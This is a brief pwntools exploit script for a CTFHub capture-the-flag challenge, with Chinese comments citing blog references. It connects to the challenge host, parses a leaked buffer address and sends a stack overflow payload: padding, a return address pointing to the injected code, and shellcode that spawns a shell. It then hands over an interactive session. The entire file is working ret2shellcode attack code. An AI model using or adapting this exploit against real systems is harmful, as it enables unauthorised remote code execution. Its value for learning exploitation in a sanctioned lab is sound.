from pwn import *

#参考 https://blog.csdn.net/m0_43405474/article/details/126546838
#    https://www.cnblogs.com/wulitaotao/p/13909451.html
context(arch='amd64',os='linux')

host='challenge-234bbbd198297fc1.sandbox.ctfhub.com'
port=38544
io=connect(host,port)
#io=process('./pwn2')
padding=0x18 #看ida所得
#Get the addr of buf
io.recvuntil('[')
buf_addr=io.recvuntil(']',drop=True)
io.recvuntil('Input someting :')
print('buf_addr:',buf_addr)

payload=flat(['a'*padding,p64(int(buf_addr,16)+32),asm(shellcraft.sh())])
#p64(int(buf_addr,16)+32) 是在返回地址中填入shellcode应该在的地址，也就是buf的地址+buf大小（0x18->24）+返回地址长度(8)
print('payload:',payload)

io.sendline(payload)
io.interactive()


